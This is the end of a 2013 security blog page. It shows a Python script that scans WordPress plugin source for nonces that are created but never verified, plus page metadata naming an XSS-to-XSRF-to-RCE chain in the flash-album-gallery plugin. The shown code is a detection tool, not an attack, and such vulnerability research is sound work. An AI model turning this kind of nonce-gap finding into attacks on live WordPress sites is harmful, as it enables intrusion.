                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">fname</span><span class="p">),</span> <span class="s">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                    <span class="n">callback</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(),</span> <span class="n">fname</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">noncescan</span><span class="p">(</span><span class="n">fdata</span><span class="p">,</span> <span class="n">fname</span><span class="p">):</span>
    <span class="n">scan_nonce_creation</span><span class="p">(</span><span class="n">fdata</span><span class="p">,</span> <span class="n">fname</span><span class="p">)</span>
    <span class="n">verify_nonces</span><span class="p">(</span><span class="n">fdata</span><span class="p">,</span> <span class="n">fname</span><span class="p">)</span>

<span class="c"># Returns a list of all nonces created. Very greedy approach.</span>
<span class="k">def</span> <span class="nf">scan_nonce_creation</span><span class="p">(</span><span class="n">fdata</span><span class="p">,</span> <span class="n">fname</span><span class="p">):</span>
      <span class="n">dmsg</span><span class="p">(</span><span class="s">&#39;[+] Scanning for nonces in {0}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">fname</span><span class="p">))</span>
      <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">R_NONCE_CREATION</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">fdata</span><span class="p">):</span>
          <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">R_STRING</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">()):</span>
              <span class="n">matches</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">group</span><span class="p">())</span>

<span class="c"># Checks with a list if the nonce was verified.</span>
<span class="k">def</span> <span class="nf">verify_nonces</span><span class="p">(</span><span class="n">fdata</span><span class="p">,</span> <span class="n">fname</span><span class="p">):</span>
    <span class="n">dmsg</span><span class="p">(</span><span class="s">&#39;[+] Verifing found actions in {0}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">fname</span><span class="p">))</span>
    <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">R_NONCE_CHECK</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">fdata</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">R_STRING</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">()):</span>
            <span class="n">checked</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">group</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">report</span><span class="p">():</span>
    <span class="c"># Now the two lists &#39;matches&#39; and &#39;checked&#39; both hold</span>
    <span class="c"># all the found $action string arguments that were passed</span>
    <span class="c"># to the nonce creation functions and again when the nonce</span>
    <span class="c"># was to be checked. We strip duplicates in both lists and show which</span>
    <span class="c"># remain in &#39;matches&#39; and aren&#39;t in &#39;checked&#39;.</span>
    <span class="c"># remark: python is magical!</span>
    <span class="n">clean</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">[</span><span class="n">i</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;&quot;&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&quot;&#39;&quot;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">x</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;[^a-zA-Z0-9_</span><span class="se">\&#39;</span><span class="s">&quot;]&#39;</span><span class="p">,</span> <span class="n">i</span><span class="p">)]</span>
    <span class="n">m</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">clean</span><span class="p">(</span><span class="n">matches</span><span class="p">))</span>
    <span class="n">c</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">clean</span><span class="p">(</span><span class="n">checked</span><span class="p">))</span>
    <span class="n">z</span> <span class="o">=</span> <span class="n">m</span> <span class="o">-</span> <span class="n">c</span>
    <span class="k">print</span><span class="p">(</span><span class="s">&#39;&#39;&#39; [!] Found {0} strings within nonce creation functions and </span>
<span class="s">{1} strings in nonce confirming functions. There remain {2} </span>
<span class="s">strings that are in nonce creation functions, but aren&#39;t in </span>
<span class="s">confirming functions.&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">m</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">c</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">z</span><span class="p">)))</span>
    <span class="k">print</span><span class="p">(</span><span class="n">z</span><span class="p">)</span>

<span class="c"># Simple debugging function.</span>
<span class="k">def</span> <span class="nf">dmsg</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">&quot;basedir&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">&quot;starting directory of analysis&quot;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>

    <span class="n">apply_on_file_content</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">basedir</span><span class="p">,</span> <span class="n">noncescan</span><span class="p">)</span>
    <span class="n">report</span><span class="p">()</span>
</pre></div>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="/tag/exploit.html">Exploit</a>
      <a href="/tag/programming.html">Programming</a>
      <a href="/tag/bug.html">Bug</a>
      <a href="/tag/security.html">Security</a>
      <a href="/tag/xss.html">Xss</a>
      <a href="/tag/rce.html">Rce</a>
    </p>
  </div>
</article>

    <footer>
      <p>&copy; Nikolai Tschacher 2015</p>
<p>Built using <a href="http://getpelican.com" target="_blank">Pelican</a> - <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a> theme by <a href="http://alexandrevicenzi.com" target="_blank">Alexandre Vicenzi</a></p>    </footer>
  </main>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BlogPosting",
  "name": "No 2. - flash-album-gallery: persistent XSS exploitet with help of XSRF leading to remote code execution.",
  "headline": "No 2. - flash-album-gallery: persistent XSS exploitet with help of XSRF leading to remote code execution.",
  "datePublished": "2013-07-27 15:44:00+02:00",
  "dateModified": "",
  "author": {
    "@type": "Person",
    "name": "Nikolai Tschacher",
    "url": "/author/nikolai-tschacher.html"
  },
  "image": "{{ SITEURL }}/{{ THEME_STATIC_DIR }}/img/profile.png",
  "url": "/no-2-flash-album-gallery-persistent-xss-exploitet-with-help-of-xsrf-leading-to-remote-code-execution-k.html",
  "description": "PLUGIN: http://wordpress.org/plugins/flash-album-gallery/ AFFECTED VERSION: 3.01 DOWNLOADS: 840,714 RISK: MEDIUM/HIGH The following blog post addresses a critical (chain) of security issues in the version 3.01 of flash-album-gallery which eventually leads to remote code execution. The exploit is not completely automatically and needs a ..."
}
</script></body>
</html>